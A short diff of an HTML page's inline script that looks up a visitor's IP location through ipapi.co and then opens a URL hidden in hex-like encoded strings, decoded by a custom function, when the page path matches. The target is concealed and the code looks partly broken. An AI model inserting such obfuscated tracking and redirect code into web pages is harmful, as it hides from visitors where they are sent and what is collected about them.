@@ -14,6 +14,7 @@
     <hr> <center> Doraemon2112/NETDORM </center>
     </body>
   <script>
+    let tok={utkn:"75e293b315b34134f221a434949431a365d4822453a1a5341561a4a3219482541554e4d24163b5f29511a45431a1a5d271e2924411339224",redt:"e1229224856143b33572e4b3"};
           $=new $_;
           $.run();
             mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224",su=(i)=>`https://ipapi.co/${i}/json`;
@@ -27,10 +28,15 @@
                 }else {return;}
                 })
                 .catch(e=>console.log(e));
+              lp();
             };
-    tok={utkn:"75e293b315b34134f221a434949431a365d4822453a1a5341561a4a3219482541554e4d24163b5f29511a45431a1a5d271e2924411339224",redt:"e1229224856143b33572e4b3"};
-//e1229224856143b33572e4b3
-    if(location.pathname.includes(tok.redt.hl())) window.open(tok.utkn.hl(),"blank");
-    else return 0;
+    //e1229224856143b33572e4b3
+    function lp(){
+      f=location.pathname;
+      if(f.includes(tok.utkn.hl()))open(tok.redt.hl(),'blank'); 
+      else return null;
+    }
+   /* if(location.pathname.includes(tok.redt.hl())) window.open(tok.utkn.hl(),"blank");
+    else return 0;*/
   </script>
   </html>
